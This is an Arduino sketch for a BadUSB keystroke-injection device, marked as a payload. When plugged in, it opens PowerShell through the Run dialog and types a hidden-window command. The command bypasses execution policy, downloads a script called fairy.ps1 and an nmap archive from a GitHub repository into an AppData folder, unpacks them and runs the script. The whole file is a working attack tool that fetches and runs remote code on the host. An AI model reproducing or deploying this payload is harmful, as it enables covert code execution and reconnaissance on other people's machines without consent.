#include <Keyboard.h>

char windowsKey = KEY_LEFT_GUI;

void setup() {
  Keyboard.begin();
  //////////// PAYLOAD START ////////////

  delay(1000);  

  // win+r 
  Keyboard.press(windowsKey);
  Keyboard.press('r');
  Keyboard.releaseAll();
  
  delay(500);

  // enter powershell command
  Keyboard.println("powershell");

  delay(2500);

  // enter deploy command
  Keyboard.println("powershell.exe -WindowStyle Hidden -Command {Set-ExecutionPolicy Bypass -Scope Process -Force; New-Item $env:APPDATA -Name \"Fairy\" -ItemType \"Directory\" -Force; Set-Location -Path \"$($env:APPDATA)\\Fairy\"; Invoke-WebRequest -Uri https://raw.githubusercontent.com/h3xagon0001/arduino-micro-badusb/refs/heads/main/fairy.ps1 -OutFile fairy.ps1; Invoke-WebRequest -Uri https://github.com/h3xagon0001/arduino-micro-badusb/raw/refs/heads/main/nmap.zip -OutFile nmap.zip; Expand-Archive -LiteralPath \"./nmap.zip\" -DestinationPath \"$($env:APPDATA)\\Fairy\" -Force; ./fairy.ps1}");

  //////////// PAYLOAD END ////////////
  Keyboard.end();
}

void loop() {
  // put your main code here, to run repeatedly:

}
